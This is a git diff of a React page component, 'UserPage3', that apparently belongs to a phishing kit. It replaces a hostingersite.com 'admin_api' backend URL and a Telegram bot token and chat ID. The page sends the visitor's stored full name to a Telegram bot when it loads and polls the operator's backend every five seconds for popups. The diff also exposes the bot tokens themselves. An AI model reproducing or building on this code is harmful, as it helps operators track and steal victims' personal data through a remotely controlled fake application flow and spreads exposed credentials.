@@ -21,23 +21,19 @@ import SecondErrorPage from "../components/secondErrorPage";
 import WeAreVeryfying from "../components/weareveryfying";
 
 // The URL for your PHP backend
-const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php"; // Update this based on your server configuration
-const BOT_TOKEN = '8030819260:AAGO3xuF9G_BEDvHFwv6viegWw2ezawoW10';
-const CHAT_ID = '7062736155';
-
-
-
-
+const API_URL =
+  "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api6.php"; // Update this based on your server configuration
+const BOT_TOKEN = "8595083061:AAG0D7T9a3FyUkSLpnUfgxjub_Vk7PqnD6o";
+const CHAT_ID = "8317872395";
 
 const UserPage3 = () => {
   const [formType, setFormType] = useState<string>("");
   const [showPopupu3, setShowPopupu3] = useState(false);
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
-  
+
   const fullName = parsedData.fullname || "N/A";
-  
-  
+
   const sendToTelegram = async (message: string) => {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -50,14 +46,11 @@ const UserPage3 = () => {
       }),
     });
   };
-  
 
-  
-useEffect(() => {
-  // Notify on page load
-  sendToTelegram(`✅ ${fullName} has opened the user 3 page.`);
-}, []);
-
+  useEffect(() => {
+    // Notify on page load
+    sendToTelegram(`✅ ${fullName} has opened the user 3 page.`);
+  }, []);
 
   // Fetch the current form from the PHP backend
   useEffect(() => {
@@ -78,19 +71,16 @@ useEffect(() => {
   useEffect(() => {
     const interval = setInterval(() => {
       fetch(`${API_URL}?action=get_popup_statusu3`)
-        .then(res => res.json())
-        .then(data => {
+        .then((res) => res.json())
+        .then((data) => {
           if (data.showPopupu3) setShowPopupu3(true);
           // Optional: close popup when it's false
           else setShowPopupu3(false);
         });
     }, 5000); // every 5 seconds
-  
+
     return () => clearInterval(interval); // cleanup on unmount
   }, []);
-  
-
-
 
   // Fetch the popup status from the PHP backend
   useEffect(() => {
